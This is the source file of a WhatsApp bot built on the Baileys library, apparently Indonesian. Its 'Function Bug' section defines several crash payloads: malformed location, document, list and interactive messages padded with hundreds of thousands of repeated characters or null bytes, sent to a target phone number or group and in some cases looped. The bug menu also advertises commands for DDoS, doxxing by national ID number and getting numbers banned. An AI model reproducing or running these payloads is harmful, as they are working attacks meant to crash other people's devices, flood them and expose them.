//Creator Script MrEllen & Alena Bot.sh(Taufik)

require('./settings')
require('./lib/language')
require('./lib/virtex/virus')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = global.baileys1
const fs = require('fs')
const { mode } = require('./lib/mode')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = rxhl = async (rxhl, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/owner.json'))
const murbug = JSON.parse(fs.readFileSync('./lib/murbug.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await rxhl.decodeJid(rxhl.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMurbug = [botNumber, ...murbug].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const text = q = args.join(' ')
const yts = require("yt-search")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await rxhl.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const rxhlimage = fs.readFileSync('./lib/image/rxhl.jpg')
const image = fs.readFileSync('./file/logo.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const virgam = fs.readFileSync('./lib/virtex/virgam.jpeg')
const slayer07 = fs.readFileSync('./lib/image/slayer07.jpg')
const ytdl = require("ytdl-core")
const bugthumb = fs.readFileSync ('./lib/image/mamak.jpg')
const { startbot, stopjadibot } = require('./lib/start')
const responbug = 'wait for the process to complete'

//
const ctext = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var xyz = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  abc.map((v, i) =>
    replacer.push({
      original: v,
      convert: xyz[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};
   
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
// Hahahaha
if (!rxhl.public) {
if (!isCreator) return
}

if (command) {
console.log("");
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
rxhl.sendPresenceUpdate(jd, from)
}

async function loading () {
var rxhlloading = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"Loading Selesai..."
]
let { key } = await rxhl.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
for (let i = 0; i < rxhlloading.length; i++) {
await rxhl.sendMessage(from, {text: rxhlloading[i], edit: key });
}
}

// Function Penting

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

rxhl.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
/** memperbaiki kode busuk dari sipalig bug */
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
		  header: opts.header,
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await rxhl.sendPresenceUpdate('composing', jid)
      return rxhl.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   

// batas

// Function Bug

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": rxhlimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"EllenOfficial ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `RxhlOfc`
}
}
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `CyberdarkBOT BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    rxhl.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "RxhlCrash",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #EllenOfficial"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `CyberdarkBOT DOCUMENT ✅`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "RXHL MODS WHATSAPP" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+"ꦾ".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "RXHL MODS WHATSAPP"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'RXHL MODS WHATSAPP', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  rxhl.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `EllenOfficial`
}
}
}

async function iponcrash(target) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rxhl.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›EllenOfficial"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await rxhl.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(500)
sendExtendedTextMessage(jid)
}


//Waktu
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var nanoliatwaktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var nanoliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var nanoliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var nanoliatwaktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var nanoliatwaktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var nanoliatwaktu = `Selamat Pagi 🌄`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
// Batas 


const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const replynano = (teks) => {
rxhl.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.botname}`,
"body": `${nanoliatwaktu} ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://telegra.ph/file/a92c7a6abdf2acb9ecd99.jpg',
"sourceUrl": 'https://www.instagram.com/mr.ellen11'}}},
{ quoted: m})
}

const reply = (teks) => {
rxhl.sendMessage(from, { text: teks }, { quoted : m })
}

const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `MrEllen DEVELOPER 🌛`, "previewType": "PHOTO","thumbnail": rxhlimage}}}, { quoted:m})} 

const replyz = (teks) => { 
rxhl.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "VIP-Cyber-V01 ✅", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": rxhlimage, 
"mediaUrl": "https://telegra.ph/file/36376f0b21362491e91d8.jpg", 
"sourceUrl": "https://chat.whatsapp.com/KhWRxn1USyD0SWdFUN0gL4" }}}, { quoted: m }) }

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await rxhl.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
replyz(`${err}`)
}
}

const rxhlbugnew = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Rxhl Official 💸`
}
}
}

// Komen
switch(command) {
// MENU
case 'menu':
let statususer = isCreator ? 'Owner 🎐' : isMurbug ? 'Premium 💎' : 'User 👤'
ellen = fs.readFileSync(`./file/logo.jpg`)
await loading()
hohe = [ 
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}

]
ewe = `❐  ⌜ BOT MENU V01 ⌟  ❐
╎ *Hallo 👋🏻*
╎ *${nanoliatwaktu}*
╠┈┈┈┈「 *USER INFO* 」┈┈┈┈┈✧
╎𖣘• 𝙽𝙰𝙼𝙴 : ${pushname}
╎𖣘• 𝚂𝚃𝙰𝚃𝚄𝚂 : *${statususer}*
╠┈┈┈┈「 *BOT INFO* 」┈┈┈┈┈✧
╎𖣘• 𝙲𝚁𝙴𝙰𝚃𝙾𝚁 : *Mr.Ellen*
╎𖣘• 𝙱𝙾𝚃𝙽𝙰𝙼𝙴 : ${botname}
╎𖣘• 𝙿𝚁𝙴𝙵𝙸𝚇 : multi
╎𖣘• 𝚂𝚃𝙰𝚃𝚄𝚂 : online
╎𖣘• 𝚃𝚈𝙿𝙴 : case
╎𖣘• 𝙼𝙾𝙳𝙴 :${rxhl.public ? 'Public' : 'Self'}
╎𖣘• 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : 
╎ >(${runtime(process.uptime())})<
╚┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
  
╭୧⍤⃝─•◦❥•◦ \`List Bot\` 
│•⟢${prefix}botsistem
│•⟢ ${prefix}owner | comingsoon
│•⟢ ${prefix}donasi 
│•⟢ ${prefix}buypremium
│•⟢ ${prefix}rules
│•⟢ ${prefix}snk
│•⟢ ${prefix}infobot
│•⟢ ${prefix}runtime
꒰⚘݄꒱₊___________________˓˓
  
╭୧⍤⃝─•◦❥•◦   \`List Menu\` 
│•⟢ ${prefix}funmenu
│•⟢ ${prefix}aimenu
│•⟢ ${prefix}bugmenu
│•⟢ ${prefix}groupmenu
│•⟢ ${prefix}quotesmenu 
│•⟢ ${prefix}editormenu
│•⟢ ${prefix}sepesialmenu
│•⟢ ${prefix}stickermenu
│•⟢ ${prefix}downloadmenu | maintenance 
│•⟢ ${prefix}asupanmenu
│•⟢ ${prefix}soundmenu
꒰⚘݄꒱₊___________________˓˓

*╭ INFO CREATOR*
├❖ *Author  : Mr_Ellen*
├❖ *Youtub  : mr.ellen*
├❖ *Partner :*
├❍ *«Alena Bot .sh »*
├❍►| 6285868154871|
├❍ *«Raynara\»*   
├❍►| 6285815417458|
╰───────────────────╯`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`,
header: {
hasMediaAttachment: true,
imageMessage: (await prepareWAMessageMedia({ image: ellen }, { upload: rxhl.waUploadToServer })).imageMessage
}
})
break
// sistem MENU
case 'botsistem':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
 
╭୧⍤⃝─•◦❥•◦   \`Bot Sistem\` 
│
│•⟢ ${prefix}self 
│•⟢ ${prefix}public 
│•⟢ ${prefix}setppbot
│•⟢ ${prefix}setppbot /full
│•⟢ ${prefix}addowner 62xxx
│•⟢ ${prefix}dellowner 62xxx
│•⟢ ${prefix}addpremium 62xxx
│•⟢ ${prefix}dellpremium 62xxx
│•⟢ ${prefix}listuser
│•⟢ ${prefix}listpremium
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
case 'mode':
					
                 if (!isMurbug) return replyz(global.nocreator)
					rxhl.sendMessage(from, mode(prefix), text)
					break
case 'bugmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`Bug Crash Chat \`
│
│•⟢ ${prefix}bugcrash *+628xxx*
│•⟢ ${prefix}bugsystem *+628xxx*
│•⟢ ${prefix}crash1jam *+628xxx*
│•⟢ ${prefix}crash1hari *+628xxx*
│•⟢ ${prefix}xreactpc *+628xxx*
│•⟢ ${prefix}bugiospc *+628xxx|Amount*
│•⟢ ${prefix}bugaudiopc *+628xxx|Amount*
│•⟢ ${prefix}buglocpc *+628xxx|Amount*
│•⟢ ${prefix}bugparamspc *+628xxx|Amount*
│•⟢ ${prefix}bughomepc *+628xxx|Amount*
│•⟢ ${prefix}bannedno *+628xxx*
│•⟢ ${prefix}bugvid1
│•⟢ ${prefix}bugvid2
│•⟢ ${prefix}iosfull *+628xxx|Amount*
│•⟢ ${prefix}iosfullv2 *+628xxx|Amount*
│•⟢ ${prefix}samsungcrash *+628xxx|Amount*
│•⟢ ${prefix}samsungfull *+628xxx|Amount*
│•⟢ ${prefix}samsung-brutal *+628xxx|Amount*
│•⟢ ${prefix}slayer07 *+628xxx|Amount*
│•⟢ ${prefix}darkness *+628xxx|Amount*
│•⟢ ${prefix}virkon *+628xxx|Amount*
│•⟢ ${prefix}virgam *+628xxx|Amount*
│•⟢ ${prefix}crash-all-dvc *+628xxx|Amount*
│•⟢ ${prefix}all-dvc2 *+628xxx*
│•⟢ ${prefix}killwhatsapp *+628xxx*
│•⟢ ${prefix}auto-crash *+628xxx*
│•⟢ ${prefix}new-bunga *+628xxx*
│•⟢ ${prefix}kill-ripper *+628xxx*
│•⟢ ${prefix}external-crash1 *+628xxx*
│•⟢ ${prefix}onlyios-crash *+628xxx*
│•⟢ ${prefix}onlysamsung-crash *+628xxx*
│
꒰⚘݄꒱₊___________________˓˓ 
╭୧⍤⃝─•◦❥•◦   \`Bug Crash Grup\`
│
│•⟢ ${prefix}bugcrashv2 *Id Grup*
│•⟢ ${prefix}bugsystemv2  *Id Grup*
│•⟢ ${prefix}xreactgc  *Id Grup*
│•⟢ ${prefix}bugiosgc *Id Grup|Amount*
│•⟢ ${prefix}bugaudiogc *Id Grup|Amount*
│•⟢ ${prefix}buglocgc *Id Grup|Amount*
│•⟢ ${prefix}bugparamsgc *Id Grup|Amount*
│•⟢ ${prefix}bughomegc *Id Grup|Amount*
│•⟢ ${prefix}getidgrup *Link Gc*
│
꒰⚘݄꒱₊___________________˓˓
╭୧⍤⃝─•◦❥•◦   \`Bug Crash In Place\`
│
│•⟢ ${prefix}bugcrashv3
│•⟢ ${prefix}bugsystemv3  
│•⟢ ${prefix}bugparamsin 
│
꒰⚘݄꒱₊___________________˓˓
╭୧⍤⃝─•◦❥•◦   \`Bug Crash Emote\`
│
│•⟢ ${prefix}🔥  *+628xxx|Amount*
│
꒰⚘݄꒱₊___________________˓˓
╭୧⍤⃝─•◦❥•◦   \`Special Bug\`
│
│•⟢ ${prefix}cbug *628xxx|Amount*
│
꒰⚘݄꒱₊___________________˓˓
╭୧⍤⃝─•◦❥•◦   \`Other Menu \`
│
│•⟢ ${prefix}bannedno *628xxxx*
│•⟢ ${prefix}tempban  *62|8xxx*
│•⟢ ${prefix}ddos  *<website> <duration>*
꒰⚘݄꒱₊___________________˓˓
╭୧⍤⃝─•◦❥•◦   \`Special Menu V2\`
│•⟢ ${prefix}getnik
│•⟢ ${prefix}dox <nik>
│•⟢ ${prefix}txtban1
│•⟢ ${prefix}txtban2
│•⟢ ${prefix}txtban3
꒰⚘݄꒱₊___________________˓˓
╭୧⍤⃝─•◦❥•◦   \`⚠️WARNING!!\`
│
│> _ [🇮🇩] Pada menu bug crash1jam dan crash1hari diharapkan untuk tidak terlalu sering menggunakan menu tersebut. karena rawan terkena banned._
│
꒰⚘݄꒱₊___________________˓˓
`
